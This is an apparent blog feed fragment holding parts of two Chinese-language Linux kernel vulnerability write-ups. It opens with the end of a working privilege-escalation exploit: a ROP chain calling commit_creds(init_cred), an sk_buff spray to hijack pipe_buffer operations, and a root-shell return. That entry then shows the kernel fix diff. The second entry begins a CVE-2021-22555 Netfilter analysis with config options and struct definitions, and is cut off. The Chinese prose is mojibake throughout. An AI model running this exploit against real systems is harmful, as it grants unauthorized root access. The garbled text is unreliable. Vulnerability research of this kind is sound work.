class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2022/04/06/Fk975jsZhPfvyCJ.png" alt="image.png"></p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03.æ¼æ´ä¿®å¤"></a>0x03.æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´åœ¨å†…æ ¸ä¸»çº¿çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb">è¿™ä¸ª commit</a> ä¸­è¢«ä¿®å¤ï¼Œè¿™ä¸ª commit å¢åŠ çš„ä¿®æ”¹æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¯¹äºè¯¥æ¼æ´å…¶æ”¹å˜çš„éƒ¨åˆ†ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -320,7 +319,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,</span><br><span class="line">     tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"> goto err_filter;</span><br><span class="line"> /* Ignore any unknown types */</span><br><span class="line"><span class="deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)</span></span><br><span class="line"><span class="addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span></span><br><span class="line"> continue;</span><br><span class="line"> nr_filter++;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">@@ -336,7 +335,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,</span><br><span class="line"> </span><br><span class="line"> q = wfilter-&gt;filters;</span><br><span class="line"> for (i = 0; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</span></span><br><span class="line"><span class="addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span></span><br><span class="line"> continue;</span><br><span class="line"> </span><br><span class="line"> q-&gt;type= tf[i].type;</span><br></pre></td></tr></table></figure><ul><li>ä¿®å¤äº†å‰ååˆ¤å®šä¸ä¸€è‡´çš„é—®é¢˜</li><li>å°† type çš„èŒƒå›´é™å®šä¸º <code>WATCH_TYPE__NR</code>ï¼ˆå€¼ä¸º 2ï¼‰</li></ul><p>ç¬”è€…ä¸ªäººè®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘åœ¨çœ‹ç€ä½ ğŸ‘_ğŸ‘&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/"/>
    <id>http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/</id>
    <published>2022-03-31T16:18:06.000Z</published>
    <updated>2022-04-06T09:26:32.000Z</updated>
    
    <content type="html"><![CDATA[<p><del>å–·å­æ°¸è¿œæ˜¯ç‰ˆæœ¬ç­”æ¡ˆ</del></p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2021-22555 æ˜¯ Linux Netfilter æ¨¡å—ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œæ¼æ´ä¸»è¦å‘ç”Ÿåœ¨64 ä½ç³»ç»Ÿä¸Šä¸º 32 ä½è¿›ç¨‹å¤„ç† setsockopt æ—¶ï¼Œè‹¥æŒ‡å®šäº† optname ä¸º <code>IPT_SO_SET_REPLACE</code>ï¼ˆæˆ– <code>IP6T_SO_SET_REPLACE</code>ï¼‰ï¼Œä¸”å¼€å¯äº†å†…æ ¸é€‰é¡¹ <code>CONFIG_USER_NS</code> ã€<code>CONFIG_NET_NS</code>ï¼Œåœ¨å†…æ ¸ç»“æ„è½¬æ¢æ—¶ç”±äºé”™è¯¯è®¡ç®—è½¬æ¢å¤§å°åˆ™ä¼šå¯¼è‡´å†…æ ¸å †ä¸Šçš„è¶Šç•Œå†™å…¥ä¸€äº› 0 å­—èŠ‚ï¼Œä»è€Œè¦†å†™ç›¸é‚» object</p><p>è¯¥æ¼æ´è‡ªå†…æ ¸ç‰ˆæœ¬ <code>v2.6.19-rc1</code> ï¼ˆ<code>9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</code>ï¼‰å¼•å…¥ï¼Œåœ¨è¿™äº›ç‰ˆæœ¬ä¸­è¢«ä¿®å¤ï¼š</p><ul><li><code>5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267</code></li></ul><p>ç”±äºå…¶å½±å“èŒƒå›´æå¤§ï¼Œä¸”åˆ©ç”¨è¾ƒä¸ºç®€å•ï¼Œæ•…è·å¾—äº† <code>7.8</code> çš„ CVSS è¯„åˆ†</p><p>åœ¨å¼€å§‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›å‰ç½®çŸ¥è¯†</p><blockquote><p>æœ¬æ–‡ä¸»è¦å‚è€ƒäº† bsauce å¤§å¸ˆå‚…å¯¹è¯¥æ¼æ´çš„åˆ†æä¸åˆ©ç”¨è¿‡ç¨‹ï¼š<a href="https://www.anquanke.com/post/id/254027">https://www.anquanke.com/post/id/254027</a></p><p>æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„å†…æ ¸æºç ä¸º <code>5.8</code> ç‰ˆæœ¬</p></blockquote><h2 id="å†…æ ¸ç¼–è¯‘é€‰é¡¹"><a href="#å†…æ ¸ç¼–è¯‘é€‰é¡¹" class="headerlink" title="å†…æ ¸ç¼–è¯‘é€‰é¡¹"></a><em>å†…æ ¸ç¼–è¯‘é€‰é¡¹</em></h2><p>é¦–å…ˆæ˜¯æ‰€æœ‰ <code>CONFIG_IP_NF_**</code> å’Œ <code>CONFIG_NETFILTER_**</code> ç›¸å…³çš„é€‰é¡¹éƒ½è¦æ‰“å¼€</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_IP_NF_IPTABLES=y</span><br><span class="line">CONFIG_IP_NF_MATCH_AH=y</span><br><span class="line">CONFIG_IP_NF_MATCH_ECN=y</span><br><span class="line">CONFIG_IP_NF_MATCH_RPFILTER=y</span><br><span class="line">CONFIG_IP_NF_MATCH_TTL=y</span><br><span class="line">CONFIG_IP_NF_FILTER=y</span><br><span class="line">CONFIG_IP_NF_TARGET_REJECT=y</span><br><span class="line">CONFIG_IP_NF_TARGET_SYNPROXY=y</span><br><span class="line">CONFIG_IP_NF_NAT=y</span><br><span class="line">CONFIG_IP_NF_TARGET_MASQUERADE=y</span><br><span class="line">CONFIG_IP_NF_TARGET_NETMAP=y</span><br><span class="line">CONFIG_IP_NF_TARGET_REDIRECT=y</span><br><span class="line">CONFIG_IP_NF_MANGLE=y</span><br><span class="line">CONFIG_IP_NF_TARGET_CLUSTERIP=y</span><br><span class="line">CONFIG_IP_NF_TARGET_ECN=y</span><br><span class="line">CONFIG_IP_NF_TARGET_TTL=y</span><br><span class="line">CONFIG_IP_NF_RAW=y</span><br><span class="line">CONFIG_IP_NF_SECURITY=y</span><br><span class="line">CONFIG_IP_NF_ARPTABLES=y</span><br><span class="line">CONFIG_IP_NF_ARPFILTER=y</span><br><span class="line">CONFIG_IP_NF_ARP_MANGLE=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER=y</span><br><span class="line">CONFIG_NETFILTER_ADVANCED=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_INGRESS=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK=y</span><br><span class="line">CONFIG_NETFILTER_FAMILY_BRIDGE=y</span><br><span class="line">CONFIG_NETFILTER_FAMILY_ARP=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_ACCT=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_QUEUE=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_LOG=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_OSF=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_CONNCOUNT=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_NETLINK_GLUE_CT=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_SYNPROXY=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XTABLES=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XT_MARK=y</span><br><span class="line">CONFIG_NETFILTER_XT_CONNMARK=y</span><br><span class="line">CONFIG_NETFILTER_XT_SET=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XT_MATCH_U32=y</span><br><span class="line"><span class="comment"># æŒºå¤šçš„ï¼Œè¿™é‡Œç¬”è€…å°±ä¸ä¸€ä¸€æ‘˜å½•äº†</span></span><br></pre></td></tr></table></figure><p>ä»¥åŠä¸‰ä¸ªå…¶ä»–é€‰é¡¹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_USER_NS=y</span><br><span class="line">CONFIG_NET_NS=y</span><br><span class="line">CONFIG_COMPAT=y</span><br></pre></td></tr></table></figure><h2 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h2><p>Netfilter ä¸º Linux å†…æ ¸ä¸­çš„ä¸€ä¸ªå­æ¨¡å—ï¼Œç”¨ä»¥æä¾›æ•°æ®åŒ…è¿‡æ»¤ã€ç½‘ç»œåœ°å€è½¬æ¢ã€ç«¯å£è½¬æ¢ç­‰åŠŸèƒ½ï¼Œå…¶æ•´ä½“æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/28/SFpO9z7YRykLnqU.png" alt="Netfilter components"></p><p>ä¾‹å¦‚ <code>iptables</code> ç­‰å·¥å…·ä¾¿æ˜¯åˆ©ç”¨ Netfilter æ‰€æä¾›çš„æ¥å£å®ç°çš„ï¼Œä¸è¿‡æœ¬ç¯‡æˆ‘ä»¬ä¸»è¦å…³æ³¨å…¶åœ¨å†…æ ¸ä¸­çš„éƒ¨åˆ†</p><p>Netfilter æ¶µç›–äº†å†…æ ¸ç½‘ç»œåè®®æ ˆçš„å¤šå±‚ï¼Œä¸€ä¸ªæ•°æ®åŒ…åœ¨ Netfilter ä¸­çš„å†ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/03/28/8UnfDE7Mry1uhgW.png" alt="image.png"></p><p>åœ¨ Netfilter ä¸­æœ‰ä¸€ç§åä¸º ã€Œtableã€ çš„ç»“æ„ï¼Œç”¨ä»¥å­˜å‚¨ä¸åŒåŠŸèƒ½çš„é…ç½®ä¿¡æ¯ï¼Œåœ¨å†…æ ¸å½“ä¸­ä½¿ç”¨ <code>xt_table</code> ç»“æ„è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Furniture shopping... */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* What hooks you will enter on */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> valid_hooks;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Man behind the curtain... */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">private</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set this to THIS_MODULE if you are a module, otherwise NULL */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">me</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int8_t</span> af;<span class="comment">/* address/protocol family */</span></span><br><span class="line"><span class="type">int</span> priority;<span class="comment">/* hook order */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* called when table is needed in the given netns */</span></span><br><span class="line"><span class="type">int</span> (*table_init)(<span class="keyword">struct</span> net *net);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* A unique name... */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> name[XT_TABLE_MAXNAMELEN];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„å…¶å®æ˜¯ä¸€å±‚ wrapperï¼Œå…¶æ ¸å¿ƒç»“æ„ä¸º <code>xt_table_info</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The table itself */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> &#123;</span></span><br><span class="line"><span class="comment">/* Size per table */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"><span class="comment">/* Number of entries: FIXME. --RR */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> number;</span><br><span class="line"><span class="comment">/* Initial number of entries. Needed for module usage count */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> initial_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Entry points and underflows */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hook_entry[NF_INET_NUMHOOKS];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> underflow[NF_INET_NUMHOOKS];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of user chains. Since tables cannot have loops, at most</span></span><br><span class="line"><span class="comment"> * @stacksize jumps (number of user chains) can possibly be made.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> stacksize;</span><br><span class="line"><span class="type">void</span> ***jumpstack;<span class="comment">// æˆ‘è¶…ï¼Œä¸‰çº§æŒ‡é’ˆï¼</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> entries[] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨æ¯å¼   table ä¸Šæœ‰å¤šä¸ª chainï¼Œå¯¹åº”è¡¨ç¤ºæŠ¥æ–‡çš„æ‹¦æˆªå¤„ç†ç‚¹ï¼Œä¾‹å¦‚ç½‘ç»œå±‚ä¸­çš„ IPåè®® ä¾¿æœ‰ 5 ä¸ªæ‹¦æˆªç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---&gt;[NF_IP_PRE_ROUTING]---&gt;[ROUTE]---&gt;[NF_IP_FORWARD]---&gt;[NF_IP_POST_ROUTING]---&gt;</span><br><span class="line">                              |                        ^</span><br><span class="line">                              |                        |</span><br><span class="line">                              |                     [ROUTE]</span><br><span class="line">                              v                        |</span><br><span class="line">                       [NF_IP_LOCAL_IN]        [NF_IP_LOCAL_OUT]</span><br><span class="line">                              |                        ^</span><br><span class="line">                              |                        |</span><br><span class="line">                              v                        |</span><br><span class="line">                             --------Local Process-------</span><br></pre></td></tr></table></figure><p>åœ¨æ¯ä¸ª chain ä¸­è¿˜æœ‰ä¸€äº›ç”¨æˆ·é…ç½®çš„ ruleï¼Œä¸€æ¡ rule å¯èƒ½åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªåŒ¹é…è§„åˆ™ï¼ˆmatchï¼‰å’Œä¸€ä¸ªæ‰§è¡ŒåŠ¨ä½œï¼ˆtargetï¼‰ï¼Œè‹¥æŠ¥æ–‡ match äº†ï¼Œåˆ™æ‰§è¡Œ target æ¥å¤„ç†æŠ¥æ–‡ï¼›æ ‡å‡†çš„åŒ¹é…å…ƒç´ åŒ…å«æº&#x2F;ç›®çš„IPåœ°å€ã€æ¥æ”¶&#x2F;å‘é€è®¾å¤‡ã€ä¼ è¾“å±‚åè®®è¿™äº”ä¸ªå…ƒç´ ï¼Œæ ‡å‡†çš„æ‰§è¡ŒåŠ¨ä½œåŒ…å« <code>accept</code>ã€<code>drop</code>ã€<code>queue</code>ã€<code>return</code></p><p>æ¯æ¡ rule ä½¿ç”¨ä¸€ä¸ª <code>ipt_entry</code> ç»“æ„è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This structure defines each of the firewall rules.  Consists of 3</span></span><br><span class="line"><span class="comment">   parts which are 1) general IP header stuff 2) match specific</span></span><br><span class="line"><span class="comment">   stuff 3) the target to perform if the rule matches */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipt_ip</span> <span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark with fields that we care about. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nfcache;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of ipt_entry + matches */</span></span><br><span class="line">__u16 target_offset;</span><br><span class="line"><span class="comment">/* Size of ipt_entry + matches + target */</span></span><br><span class="line">__u16 next_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Back pointer */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> comefrom;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Packet and byte counters. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_counters</span> <span class="title">counters</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The matches (if any), then the target. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> elems[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œ rule å’Œ target åˆ™åˆ†åˆ«ä½¿ç”¨ <code>xt_entry_match</code> ä¸ <code>xt_entry_target</code> ç»“æ„è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 match_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used by userspace */</span></span><br><span class="line"><span class="type">char</span> name[XT_EXTENSION_MAXNAMELEN];</span><br><span class="line">__u8 revision;</span><br><span class="line">&#125; user;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 match_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used inside the kernel */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_match</span> *<span class="title">match</span>;</span></span><br><span class="line">&#125; kernel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Total length */</span></span><br><span class="line">__u16 match_size;</span><br><span class="line">&#125; u;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 target_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used by userspace */</span></span><br><span class="line"><span class="type">char</span> name[XT_EXTENSION_MAXNAMELEN];</span><br><span class="line">__u8 revision;</span><br><span class="line">&#125; user;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 target_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used inside the kernel */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span>;</span></span><br><span class="line">&#125; kernel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Total length */</span></span><br><span class="line">__u16 target_size;</span><br><span class="line">&#125; u;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>table-&gt;chain-&gt;rule</code> çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºå•ä¸ª rule åœ¨æ¯ä¸ª CPU ä¸Šéƒ½ç»´æŠ¤äº†ä¸€ä»½ä»–çš„æ‹·è´ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†å‡å°‘é”çš„ä½¿ç”¨ã€å¢åŠ  L1 cache çš„å‘½ä¸­æ¬¡æ•°ï¼Œä»¥ç©ºé—´æ¢æ—¶é—´</p><p><img src="https://s2.loli.net/2022/03/29/4hwpn7HdagVIiQL.png" alt="image.png"></p><h2 id="64-ä½ä¸‹çš„-setsockopt-ç³»ç»Ÿè°ƒç”¨"><a href="#64-ä½ä¸‹çš„-setsockopt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="64 ä½ä¸‹çš„ setsockopt ç³»ç»Ÿè°ƒç”¨"></a><em>64 ä½ä¸‹çš„ setsockopt ç³»ç»Ÿè°ƒç”¨</em></h2><blockquote><p>å’Œæœ¬æ¼æ´æ²¡æœ‰å…³è”ï¼Œä½†æ˜¯ç¬”è€…æ²¡æ³¨æ„ç»™åˆ†æäº†ä¸€éâ€¦èŠ±äº†æŒºå¤šåŠ›æ°”æ‰€ä»¥è¿™é‡Œä¹Ÿä¸æƒ³åˆ 